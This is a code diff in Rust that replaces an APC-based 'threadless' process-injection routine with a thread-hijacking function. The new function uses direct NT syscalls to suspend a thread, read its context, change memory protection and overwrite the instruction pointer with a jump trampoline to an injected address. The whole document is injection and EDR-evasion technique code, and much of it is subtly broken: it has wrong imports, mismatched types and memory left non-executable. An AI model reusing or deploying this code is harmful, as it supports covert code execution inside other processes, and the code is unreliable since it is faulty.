@@ -1,103 +1,96 @@
-use std::fs::File;
-use std::io::Read;
 use std::ptr::null_mut;
-use winapi::um::processthreadsapi::{OpenProcess, OpenThread, SuspendThread, ResumeThread, GetThreadId};
-use winapi::um::winnt::{THREAD_SUSPEND_RESUME, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
-use winapi::um::memoryapi::VirtualAllocEx;
-use winapi::um::winnt::{PROCESS_QUERY_INFORMATION, PROCESS_VM_READ, PROCESS_VM_WRITE, PROCESS_CREATE_THREAD, DWORD};
-use winapi::shared::minwindef::{FALSE};
-use std::ffi::OsString;
-use std::os::windows::ffi::OsStringExt;
-use std::mem::size_of;
-use std::thread;
-use winapi::um::processthreadsapi::QueueUserAPC;
-use winapi::um::minwinbase::PAPCFUNC;
-use std::sync::{Arc, Mutex};
+use winapi::um::winnt::{HANDLE, PVOID, SIZE_T, PAGE_READWRITE, ULONG};
+use winapi::um::winnt::CONTEXT_ALL;
+use winapi::um::processthreadsapi::CONTEXT;
+use winapi::um::memoryapi::WriteProcessMemory;
+use winapi::um::minwinbase::DWORD;
+use winapi::shared::minwindef::FALSE;
+use winapi::um::winnt::{NT_SUCCESS};
+use syscall::syscall;
 
-fn main() {
-    // Get the current process handle
-    let process_handle = unsafe { OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, 0) };
-    if process_handle.is_null() {
-        println!("Failed to open current process");
-        return;
+fn jmp_hijack_thread(h_thread: HANDLE, p_address: PVOID, h_process: HANDLE) -> Result<(), String> {
+    // Suspend the thread
+    let status_suspend = unsafe { syscall!("NtSuspendThread", h_thread, null_mut::<ULONG>()) };
+    if !NT_SUCCESS(status_suspend) {
+        return Err(format!("[!] Failed to suspend thread with NTSTATUS: {:#X}", status_suspend));
     }
 
-    // Open the target DLL file
-    let mut file = File::open("target.dll").unwrap();
-    let mut dll_bytes = Vec::new();
-    file.read_to_end(&mut dll_bytes).unwrap();
-
-    // Resolve the target function address
-    let function_address = unsafe { find_function_address("my_function".to_string()) }; // Custom function name placeholder
-    if function_address.is_null() {
-        println!("Failed to resolve function address");
-        return;
+    // Get the current thread context
+    let mut context: CONTEXT = unsafe { std::mem::zeroed() };
+    context.ContextFlags = CONTEXT_ALL;
+    let status_get_context = unsafe {
+        syscall!("NtGetContextThread", h_thread, &mut context as *mut _) // Get the current thread's context
+    };
+    if !NT_SUCCESS(status_get_context) {
+        return Err(format!("[!] NtGetContextThread failed with NTSTATUS: {:#X}", status_get_context));
     }
 
-    // Calculate the jump offset for the trampoline buffer
-    let cave_address = unsafe { VirtualAllocEx(process_handle, null_mut(), size_of::<usize>(), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE) };
-    if cave_address.is_null() {
-        println!("Failed to allocate memory in the target process");
-        return;
+    // Backup the original context
+    let original_context = context.clone();
+
+    // Change memory protection to PAGE_READWRITE
+    let mut old_protect = 0;
+    let mut base_address = context.Rip as *mut u8;
+    let size = std::mem::size_of_val(&context.Rip);
+    let status_protect_memory = unsafe {
+        syscall!(
+            "NtProtectVirtualMemory",
+            h_process,
+            &mut base_address,
+            &mut size as *mut _,
+            PAGE_READWRITE,
+            &mut old_protect as *mut _
+        )
+    };
+    if !NT_SUCCESS(status_protect_memory) {
+        return Err(format!("[!] NtProtectVirtualMemory failed with NTSTATUS: {:#X}", status_protect_memory));
     }
 
-    // Calculate the jump offset for the trampoline buffer
-    let jmp_offset = function_address as usize - cave_address as usize - size_of::<usize>(); // Calculate the correct jump offset
-    let mut trampoline_buf = vec![0xE9]; // JMP opcode
-    trampoline_buf.extend_from_slice(&(jmp_offset as i32).to_le_bytes()); // Convert the offset to little-endian bytes
+    // Construct and write the trampoline directly to RIP location
+    let mut trampoline = [
+        0x48, 0xB8,
+        // placeholder bytes
+        0x11,
+        0x22,
+        0x33,
+        0x44,
+        0x55,
+        0x66,
+        0x77,
+        0x88,
+        0xFF,
+        0xE0
+    ];
+    let p_address_bytes: [u8; 8] = unsafe {
+        std::mem::transmute(p_address as u64)
+    };
+    trampoline[2..10].copy_from_slice(&p_address_bytes);
 
-    // Write the trampoline code to the code cave within the target process
-    unsafe {
-        WriteProcessMemory(process_handle, cave_address, trampoline_buf.as_ptr() as *const _, trampoline_buf.len(), null_mut());
+    // Write the trampoline to the instruction pointer (RIP) location
+    let status_write_memory = unsafe {
+        syscall!(
+            "NtWriteVirtualMemory",
+            h_process,
+            context.Rip as *mut u8,
+            trampoline.as_ptr() as *const _,
+            trampoline.len() as SIZE_T,
+            null_mut::<c_void>()
+        )
+    };
+    if !NT_SUCCESS(status_write_memory) {
+        // Restore the original context before returning
+        let _ = unsafe { syscall!("NtSetContextThread", h_thread, &original_context as *const _ as *mut CONTEXT) };
+        return Err(format!("[!] NtWriteVirtualMemory failed with NTSTATUS: {:#X}", status_write_memory));
     }
 
-    // Obtain the handle to the target thread
-    let thread_handle = unsafe { OpenThread(THREAD_SUSPEND_RESUME, FALSE, GetThreadId(process_handle)) };
-    if thread_handle.is_null() {
-        println!("Failed to obtain thread handle");
-        return;
+    // Restore the original context
+    let _ = unsafe { syscall!("NtSetContextThread", h_thread, &original_context as *const _ as *mut CONTEXT) };
+
+    // Resume the suspended thread
+    let status_resume = unsafe { syscall!("NtResumeThread", h_thread, null_mut::<ULONG>()) };
+    if !NT_SUCCESS(status_resume) {
+        return Err(format!("[!] Failed to resume thread with NTSTATUS: {:#X}", status_resume));
     }
 
-    // Suspend the target thread
-    let suspend_count = unsafe { SuspendThread(thread_handle) };
-    if suspend_count == DWORD::MAX {
-        println!("Failed to suspend thread");
-        return;
-    }
-
-    // Execute the payload using APC injection
-    let mut apc_executed = Arc::new(Mutex::new(false));
-    let apc_executed_clone = Arc::clone(&apc_executed);
-    let apc_function: PAPCFUNC = Box::into_raw(Box::new(move |_| {
-        if let Ok(mut executed) = apc_executed.lock() {
-            if !*executed {
-                // Execute payload here
-                // Example: println!("Payload executed successfully");
-                *executed = true;
-            }
-        }
-    }));
-
-    unsafe {
-        QueueUserAPC(Some(*apc_function), thread_handle, 0);
-    }
-
-    // Resume the thread's execution
-    let resume_count = unsafe { ResumeThread(thread_handle) };
-    if resume_count == DWORD::MAX {
-        println!("Failed to resume thread");
-        return;
-    }
-
-    // Wait for the payload execution to complete
-    while !*apc_executed_clone.lock().unwrap() {
-        thread::sleep(std::time::Duration::from_millis(100));
-    }
-
-    println!("Threadless injection complete.");
-}
-
-unsafe fn find_function_address(function_name: String) -> *mut u8 {
-    // Custom implementation to find function address by name
-    null_mut()
+    Ok(())
 }
